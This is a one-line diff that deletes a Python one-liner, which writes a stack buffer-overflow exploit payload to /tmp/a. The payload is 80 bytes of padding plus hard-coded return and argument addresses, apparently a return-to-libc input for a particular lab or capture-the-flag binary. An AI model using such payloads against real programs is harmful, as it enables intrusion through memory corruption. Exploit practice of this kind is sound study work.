@@ -1,1 +1,0 @@
-python -c 'print "A"*80 + "\x3e\x85\x04\x08" + "\x10\x3d\xe1\xf7" + "BBBB" + "\x92\x82\x04\x08"' > /tmp/a
